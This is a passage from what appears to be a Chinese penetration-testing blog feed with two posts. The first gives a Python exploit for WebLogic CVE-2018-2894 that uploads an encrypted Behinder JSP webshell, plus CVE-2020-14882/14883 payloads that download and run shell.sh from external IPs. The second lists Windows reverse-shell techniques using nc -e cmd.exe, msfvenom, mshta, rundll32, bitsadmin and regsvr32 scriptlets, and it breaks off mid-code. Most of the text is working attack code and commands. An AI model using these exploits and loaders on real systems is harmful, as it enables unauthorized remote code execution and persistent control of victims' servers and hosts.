get_new_work_path(host))<br>    files = &#123;<br>        <span class="hljs-string">&quot;ks_edit_mode&quot;</span>: <span class="hljs-string">&quot;false&quot;</span>,<br>        <span class="hljs-string">&quot;ks_password_front&quot;</span>: password,<br>        <span class="hljs-string">&quot;ks_password_changed&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>        <span class="hljs-string">&quot;ks_filename&quot;</span>: (<span class="hljs-string">&quot;test.jsp&quot;</span>, upload_content)<br>    &#125;<br><br>    request = requests.post(host + uri, files=files)<br>    response = request.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := re.findall(<span class="hljs-string">&quot;&lt;id&gt;(.*?)&lt;/id&gt;&quot;</span>, response):<br>        tid = <span class="hljs-keyword">match</span>[-<span class="hljs-number">1</span>]<br>        shell_path = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;host&#125;</span>/ws_utc/css/config/keystore/<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(tid)&#125;</span>_test.jsp&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-keyword">in</span> requests.get(shell_path, headers=headers).content.decode():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;host&#125;</span> exists CVE-2018-2894&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Check URL: <span class="hljs-subst">&#123;shell_path&#125;</span> &quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;host&#125;</span>  don&#x27;t exists CVE-2018-2894&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;host&#125;</span>  don&#x27;t exists CVE-2018-2894&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    start = time.time()<br>    password = <span class="hljs-string">&quot;test&quot;</span><br>    url = <span class="hljs-string">&quot;/ws_utc/resources/setting/keystore&quot;</span><br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>, dest=<span class="hljs-string">&#x27;target&#x27;</span>, default=<span class="hljs-string">&quot;http://127.0.0.1:7001&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;target, such as: http://example.com:7001&quot;</span>)<br><br>    <span class="hljs-comment"># write into behinder default jsp webshell</span><br>    upload_content = <span class="hljs-string">&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&lt;%out.println(&quot;test&quot;);%&gt;&#x27;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>, &#125;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">1</span>:<br>        sys.argv.append(<span class="hljs-string">&#x27;-h&#x27;</span>)<br>    args = parser.parse_args()<br>    target = args.target<br><br>    target = target.rstrip(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;://&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>        target = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;target&#125;</span>&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        upload_webshell(target, url)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error: \n&quot;</span>)<br>        traceback.print_exc()<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208234359536.png" alt="image-20240208234359536"></p><p>使用冰蝎连接</p><p>密码是rebeyond</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208234647328.png" alt="image-20240208234647328"></p><h1 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h1><p>这个漏洞需要联动CVE-2020-14883</p><blockquote><p>CVE-2020-14882 是一个未授权访问漏洞</p><p>CVE-2020-14883 可以反弹shell</p></blockquote><p>0x00</p><p>准备shell.sh文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208235749993.png" alt="image-20240208235749993"></p><p>然后开启http 监听服务</p><p>0x01</p><p>使用请求下载文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>target.yijinglab.com:<span class="hljs-number">50756</span><span class="hljs-regexp">/console/</span>css<span class="hljs-regexp">/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec (‘curl http:/</span><span class="hljs-regexp">/8.130.123.25:8000/</span>shell.sh -o <span class="hljs-regexp">/tmp/</span>shell.sh’);”)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209000255712.png" alt="image-20240209000255712"></p><p>下载成功</p><p>执行文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>target.yijinglab.com:<span class="hljs-number">50756</span><span class="hljs-regexp">/console/</span>css<span class="hljs-regexp">/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;/</span>bin<span class="hljs-regexp">/bash /</span>tmp/shell.sh<span class="hljs-string">&#x27;);&quot;)</span><br></code></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209000454392.png" alt="image-20240209000454392"></p><p>反弹shell</p><p>0x02</p><p>还可以尝试使用xml 下载文件，因为weblogic 会解析xml</p><p>downdoal.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[curl 139.155.49.43:8000/shell.sh -o /tmp/shell.sh]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>runshell.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[bash /tmp/shell.sh]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.128</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/console/</span>css<span class="hljs-regexp">/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(“http:/</span><span class="hljs-regexp">/8.130.123.25:8000/</span>download.xml“)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209001047734.png" alt="image-20240209001047734"></p><p>执行文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>target.yijinglab.com:<span class="hljs-number">50756</span><span class="hljs-regexp">/console/</span>css<span class="hljs-regexp">/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:/</span><span class="hljs-regexp">/8.130.123.25:8000/</span>runshell.xml<span class="hljs-string">&quot;)</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209001157563.png" alt="image-20240209001157563"></p><p>成功反弹shell</p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos反弹shell</title>
    <link href="/2024/02/06/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2024/02/06/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h1 id="反弹shell-简介"><a href="#反弹shell-简介" class="headerlink" title="反弹shell 简介"></a>反弹shell 简介</h1><h2 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h2><p>  正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png" alt="image-20240206195815095"></p><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>  反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、  权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png" alt="image-20240206200927799"></p><h1 id="反弹shell的方式"><a href="#反弹shell的方式" class="headerlink" title="反弹shell的方式"></a>反弹shell的方式</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>这种方式的话，需要考虑对方的主机是否存在nc</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">被控端：nc -lvvp <span class="hljs-number">6666</span> -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span><br>控制端：nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.106</span> <span class="hljs-number">6666</span><br>原理：被控端将cmd.<span class="hljs-keyword">exe</span>重定向到本地的<span class="hljs-number">6666</span>端口，控制端主动连接被控端的<span class="hljs-number">6666</span>端口，即可获得<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">控制端：nc -lvvp <span class="hljs-number">7777</span><br>被控端：nc -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.105</span> <span class="hljs-number">7777</span><br>原理：被控端将cmd.<span class="hljs-keyword">exe</span>重定向到控制端的<span class="hljs-number">7777</span>端口，控制端只需要监听本地的<span class="hljs-number">7777</span>端口，即可获得<span class="hljs-keyword">shell</span>。<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png" alt="image-20240206202448832"></p><p>注意使用cmd连接有问题，建议使用powershell.exe，连接的过程中需要手动确认一下，在攻击机这边输入</p><h2 id="msf中hta-server模块（mshta加载hta）"><a href="#msf中hta-server模块（mshta加载hta）" class="headerlink" title="msf中hta_server模块（mshta加载hta）"></a>msf中hta_server模块（mshta加载hta）</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">search hta_server<br>use <br><span class="hljs-built_in">set</span> target 设置为64位程序<br><span class="hljs-built_in">set</span> payload windwos/x64/metepreter/reverse_tcp<br><span class="hljs-built_in">set</span> lport 20010<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png" alt="image-20240206205131654"></p><p>使用mshta加载这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png" alt="image-20240206205154705"></p><p>成功反弹，只是火绒对网络的管控比较严格</p><h2 id="msf-nc-mshta"><a href="#msf-nc-mshta" class="headerlink" title="msf+nc+mshta"></a>msf+nc+mshta</h2><p>首先在payload 这边应该使用大马，也就是非分段式的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">lport</span>=8.130.123.25 <span class="hljs-attribute">lport</span>=9999 -f hta-psh &gt; 9999.hta<br></code></pre></td></tr></table></figure><p>然后在大马的文件之下执行http.server</p><p>并且使用nc 监听payload 的指定的端口</p><p>然后受害机器使用mshta加载</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mshta</span> http://<span class="hljs-number">192.168.79.138:8000</span>/<span class="hljs-number">9999</span>.hta<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png" alt="image-20240206210940202"></p><p>这个的原理就是使用powershell加载，但是由于xp并没有powershell所以没有办法实现</p><h2 id="cs-反弹shell"><a href="#cs-反弹shell" class="headerlink" title="cs 反弹shell"></a>cs 反弹shell</h2><p>不多说老朋友了 </p><h2 id="dll文件"><a href="#dll文件" class="headerlink" title="dll文件"></a>dll文件</h2><p>先生成一个payload 文件格式是dll</p><p>先生成一个payload用于反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.79.138 <span class="hljs-attribute">lport</span>=9999 -f dll &gt; 9999.dll<br></code></pre></td></tr></table></figure><p>然后使用handler监听</p><p>使用dll文件有两种方式</p><ul><li><p>本地加载</p> <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://192.168.79.138:8000/mingy.dll&#x27;,\&quot;</span><span class="hljs-keyword">c</span>:\august.dll\<span class="hljs-string">&quot;)&quot;</span><br>rundll<span class="hljs-number">32</span> shell<span class="hljs-number">32</span>.dll<span class="hljs-punctuation">,</span>Control_RunDLL C:\august.dll<br></code></pre></td></tr></table></figure><p>注意dll文件执行的时候必须是绝对路径</p></li><li><p>smb服务加载</p><p>首先需要安装smbserver用于开启smb服务</p><ol><li><p>clone </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fortra/im</span>packet.git<br></code></pre></td></tr></table></figure></li><li><p>安装依赖</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requiment.txt<br></code></pre></td></tr></table></figure></li><li><p>添加为系统执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install <br></code></pre></td></tr></table></figure></li><li><p>开启一个服务</p><p>低版本，在win11废除</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">smbserver<span class="hljs-selector-class">.py</span> <span class="hljs-built_in">dll</span>(服务名) <span class="hljs-number">9999</span><span class="hljs-selector-class">.dll</span>(文件名)<br></code></pre></td></tr></table></figure><p>高版本</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">smbserver</span>.py dll <span class="hljs-number">9999.</span>dll -smb2sup<span class="hljs-keyword">port</span><br></code></pre></td></tr></table></figure></li><li><p>受害者，只用这个</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.79.138</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png" alt="image-20240206225252744"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rundll32</span>.exe shell32.dll,Control_RunDLL \\<span class="hljs-number">192.168.79.138</span>\dll\<span class="hljs-number">9999</span>.dll<br></code></pre></td></tr></table></figure></li></ol></li></ul><h2 id="Metasploit-SMB-Delivery"><a href="#Metasploit-SMB-Delivery" class="headerlink" title="Metasploit SMB Delivery"></a>Metasploit SMB Delivery</h2><p>  通过Metasploit的SMB Delivery模块发起Rundll32攻击  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/smb_delivery<br>msf exploit(windows<span class="hljs-regexp">/smb/</span>smb_delivery) &gt; set srvhost <span class="hljs-number">192.168</span>.<span class="hljs-number">78.117</span><br>msf exploit(windows<span class="hljs-regexp">/smb/</span>smb_delivery) &gt; exploit –j<br>rundll32.exe \\<span class="hljs-number">192.168</span>.<span class="hljs-number">78.117</span>\GylDS\test.dll,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>加载时出现了问题，</p><p>利用Rundll32加载hta反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp lhost=<span class="hljs-number">139.155.49.43</span> lport=<span class="hljs-number">7777</span> -f hta-psh &gt; <span class="hljs-number">44</span>.hta<br><span class="hljs-attribute">bitsadmin</span> /transfer shell http://<span class="hljs-number">139.155.49.43</span>/<span class="hljs-number">44</span>.hta C:\windows\temp\<span class="hljs-number">44</span>.hta<br><span class="hljs-attribute">rundll32</span>.exe url.dll,OpenURL <span class="hljs-number">44</span>.hta<br></code></pre></td></tr></table></figure><h2 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h2><blockquote><p>Regsvr32.exe是一个命令行应用程序，是 Windows 系统提供的用来向系统注册控件或者卸载控  件的命令，如Windows注册表中的dll和ActiveX控件。  </p><p>Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p></blockquote><p>使用语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">语法:Regsvr32 [/s] [/u] [/n][/i[:cmdline]] &lt;dllname&gt;<br>/u - 注销服务器<br>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载<br>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用<br>/s - 沉默; 不显示消息框<br></code></pre></td></tr></table></figure><p>本地调用计算器</p><blockquote><p>cmd.sct</p></blockquote><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span> </span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;PoC&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> &gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">                &lt;![CDATA[</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">                        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">                ]]&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>regsvr32.exe &#x2F;n &#x2F;s &#x2F;u &#x2F;i:cmd.sct scrobj.dll（系统自带的文件）</p></blockquote><p>反弹shell只需要将前面执行计算器的指令换成执行反弹shell的就好了</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nsis">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;<br>&lt;scriptlet&gt;<br>&lt;registration progid=<span class="hljs-string">&quot;PoC&quot;</span> classid=<span class="hljs-string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;<br>&lt;script language=<span class="hljs-string">&quot;JScript&quot;</span>&gt;<br>    &lt;![CDATA[<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">r</span> = new ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&#x27;powershell -w 